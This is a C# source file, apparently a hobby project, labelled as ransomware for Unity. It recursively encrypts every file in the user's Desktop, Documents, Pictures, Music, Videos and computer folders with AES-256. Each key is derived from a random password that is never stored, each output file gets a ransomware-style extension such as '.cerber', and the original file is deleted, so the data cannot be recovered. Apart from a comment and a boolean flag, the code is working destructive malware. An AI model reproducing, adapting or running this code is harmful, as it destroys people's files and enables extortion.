using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace UnityRansomware
{
     static class Ransomware_Script_with_logs
    {

        private static string RandomString(int length, bool chinese) //Generate a Unice Password for the File
        {
            Random rand = new Random();
            const string pool = "abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string poolchinese = "ㄓㄨㄥㄨㄣ中文字将制造款世界上最先进的飞机这是份非常简单的说明书";
            var builder = new StringBuilder();

            for (var i = 0; i < length; i++)
            {
                if (chinese)
                {
                    var c = poolchinese[rand.Next(0, poolchinese.Length)];
                    builder.Append(c);
                }
                else
                {
                    var c = pool[rand.Next(0, pool.Length)];
                    builder.Append(c);
                }

            }

            return builder.ToString();
        }
        public static string selectExtension() //Call this Methode to get a Random Extension
        {
            return fileextensions.ToList().PickRandom();
        }

        // <summary>Random Filename</summary>
        private static string[] fileextensions = { ".unityransomware", ".unityran", ".meiransomware", ".catgirl", ".owo", ".nyaa", ".micro", ".cerber", ".osiris" };
        private static T PickRandom<T>(this List<T> enumerable)
        {
            int index = new System.Random().Next(0, enumerable.Count());
            return enumerable[index];

        }


        private static string MY_COMPUTER = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);    //Not sure if he can encrypt that
        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);


        //This Methode use Folder Path to Encrypt the Files. Without admin you can only encrypt *.txt, *.{media}
        //This bool is for Safty. Dont use that to encrypt other PCs

        public static void Startencrypt(bool a)
        {
            if (a)
            {
                encryptStuff(DESKTOP_FOLDER);
                encryptStuff(DOCUMENTS_FOLDER);
                encryptStuff(PICTURES_FOLDER);
                encryptStuff(MUSIC_FOLDER);
                encryptStuff(VIDEOS_FOLDER);
                encryptStuff(MY_COMPUTER);
            }
        }

        private static void encryptStuff(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Crypto(f, RandomString(15, false)); //Randomstring make it not tooo high bc ram ;D
                        File.Delete(f);
                    }

                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptStuff(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }
        private static string ENCRYPTED_FILE_EXTENSION = selectExtension(); //Unity Ransomeware file extension, now in Random.
        private static void Crypto(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;
            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {

                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {

            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);

            }
        }

        public static byte[] GenerateRandomSalt() //generate salt
        {
            System.Random random = new System.Random();
            byte[] data = new byte[random.Next(14, 256)]; //Generate a Random Salt

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

    }
}
